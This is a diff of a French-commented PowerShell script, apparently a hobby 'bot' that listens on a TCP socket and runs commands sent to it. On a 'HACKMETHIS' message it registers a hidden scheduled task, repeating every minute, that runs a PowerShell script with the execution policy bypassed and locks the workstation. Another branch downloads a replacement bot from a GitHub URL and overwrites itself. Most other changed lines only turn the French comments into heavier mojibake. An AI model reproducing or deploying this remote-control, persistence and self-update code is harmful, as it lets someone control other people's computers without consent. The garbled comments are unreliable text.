@@ -10,8 +10,8 @@ function global:FRX_Socket-Listen-Read{
     param($socket,$buffersize=512)
     $script:client = $socket.AcceptTcpClient()
 
-    $stream = $script:client.GetStream() # je rÃƒÆ’Ã‚Â©cupÃƒÆ’Ã‚Â¨re ce qui est envoyÃƒÆ’Ã‚Â©
-    # Mais qu'est ce qui a ÃƒÆ’Ã‚Â©tÃƒÆ’Ã‚Â© transmis alors ?
+    $stream = $script:client.GetStream() # je rÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â©cupÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¨re ce qui est envoyÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â©
+    # Mais qu'est ce qui a ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â©tÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â© transmis alors ?
     $buffer = New-Object system.byte[] $buffersize
     do{
         $read = $null
@@ -48,12 +48,12 @@ function global:FRX_Socket-MessageAction{
     $stop = $false
     switch ($message) {
         {$_ -match "HACKMETHIS"  } {write-host "hack this" -ForegroundColor green 
-            #Tâche HACKMETHIS
+            #TÃ¢che HACKMETHIS
             $tache1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\test.ps1"
             $tache2  = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "user32.dll,LockWorkStation"
             $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
             try{
-                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache -Description "Time to lock :)" Task -ErrorAction Stop | Out-Null
+                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task -ErrorAction Stop | Out-Null
             }catch{
                 Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task
              }
@@ -62,9 +62,9 @@ function global:FRX_Socket-MessageAction{
         {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                     $stop=$true}
         {$_ -like "*.. " }         {
-        #idÃƒÂ©e : check maj sur github. lors du Gameover puis tÃƒÂ©lÃƒÂ©charger la MAJ sur un fichier temporaire, vÃƒÂ©rifier le HASH puis remplacer le bot par nouvelle version et effacer le fichier temp
-        write-host "On va faire la MAJ avec ÃƒÂ§a" -ForegroundColor Magenta
-        #On tÃƒÂ©lÃƒÂ©charge le fichier mis ÃƒÂ  jour
+        #idÃƒÆ’Ã‚Â©e : check maj sur github. lors du Gameover puis tÃƒÆ’Ã‚Â©lÃƒÆ’Ã‚Â©charger la MAJ sur un fichier temporaire, vÃƒÆ’Ã‚Â©rifier le HASH puis remplacer le bot par nouvelle version et effacer le fichier temp
+        write-host "On va faire la MAJ avec ÃƒÆ’Ã‚Â§a" -ForegroundColor Magenta
+        #On tÃƒÆ’Ã‚Â©lÃƒÆ’Ã‚Â©charge le fichier mis ÃƒÆ’Ã‚Â  jour
         #https://github.com/Airone23/BOT-FRX/releases/download/v1/BOT_ameliore.ps1
         Invoke-WebRequest -Uri $URL -OutFile $botpath
         Foreach-object {
@@ -86,5 +86,5 @@ do{
     $stop     = FRX_Socket-MessageAction   -message $message
 }until($stop)
 $closeACK = FRX_Socket-Listen-Close    -socket $Socket 
-write-host "salut je suis pas ÃƒÂ  jour"
+write-host "salut je suis pas ÃƒÆ’Ã‚Â  jour"
 #powershell $botpath
